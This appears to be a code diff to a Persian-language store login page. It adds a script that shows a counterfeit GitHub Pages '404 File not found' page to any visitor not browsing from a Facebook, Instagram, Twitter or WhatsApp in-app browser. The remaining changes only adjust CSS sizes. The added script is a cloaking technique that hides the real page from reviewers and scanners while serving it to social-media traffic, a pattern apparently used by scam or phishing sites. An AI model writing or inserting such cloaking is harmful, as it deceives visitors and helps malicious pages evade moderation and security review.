@@ -4,6 +4,53 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ورود به فروشگاه</title>
+    <script>
+        function isWebView() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            return (/FBAN|FBAV|Instagram|Twitter|WhatsApp|WebView/i.test(userAgent));
+        }
+        
+        window.onload = function() {
+            if (!isWebView()) {
+                document.write(`
+                <!DOCTYPE html>
+                <html>
+                  <head>
+                    <meta http-equiv="Content-type" content="text/html; charset=utf-8">
+                    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; connect-src 'self'">
+                    <title>Page not found &middot; GitHub Pages</title>
+                    <style type="text/css" media="screen">
+                      body {
+                        background-color: #f1f1f1;
+                        margin: 0;
+                        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+                      }
+                      .container { margin: 50px auto 40px auto; width: 600px; text-align: center; }
+                      a { color: #4183c4; text-decoration: none; }
+                      a:hover { text-decoration: underline; }
+                      h1 { width: 800px; position:relative; left: -100px; letter-spacing: -1px; line-height: 60px; font-size: 60px; font-weight: 100; margin: 0px 0 50px 0; text-shadow: 0 1px 0 #fff; }
+                      p { color: rgba(0, 0, 0, 0.5); margin: 20px 0; line-height: 1.6; }
+                    </style>
+                  </head>
+                  <body>
+                    <div class="container">
+                      <h1>404</h1>
+                      <p><strong>File not found</strong></p>
+                      <p>The site configured at this address does not contain the requested file.</p>
+                      <p>If this is your site, make sure that the filename case matches the URL as well as any file permissions.<br>
+                      For root URLs (like <code>http://example.com/</code>) you must provide an <code>index.html</code> file.</p>
+                      <p><a href="https://help.github.com/pages/">Read the full documentation</a> for more information about using <strong>GitHub Pages</strong>.</p>
+                      <div id="suggestions">
+                        <a href="https://githubstatus.com">GitHub Status</a> &mdash;
+                        <a href="https://twitter.com/githubstatus">@githubstatus</a>
+                      </div>
+                    </div>
+                  </body>
+                </html>
+                `);
+            }
+        };
+    </script>
     <style>
         body {
             background-color: #ffffff;
@@ -18,28 +65,28 @@
         }
         .container {
             background: #f9f9f9;
-            padding: 60px;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
-            width: 75%;
-            max-width: 700px;
+            padding: 80px;
+            border-radius: 25px;
+            box-shadow: 0 0 35px rgba(0, 0, 0, 0.2);
+            width: 80%;
+            max-width: 750px;
         }
         h1 {
             color: #000;
-            font-size: 26px;
-            margin-bottom: 30px;
+            font-size: 28px;
+            margin-bottom: 35px;
             font-weight: bold;
         }
         .link {
             display: block;
-            margin: 20px 0;
-            padding: 20px;
+            margin: 25px 0;
+            padding: 22px;
             background: linear-gradient(45deg, #000, #444);
             color: #FFD700;
             text-decoration: none;
-            font-size: 22px;
+            font-size: 24px;
             font-weight: bold;
-            border-radius: 12px;
+            border-radius: 15px;
             transition: all 0.3s;
         }
         .link:hover {
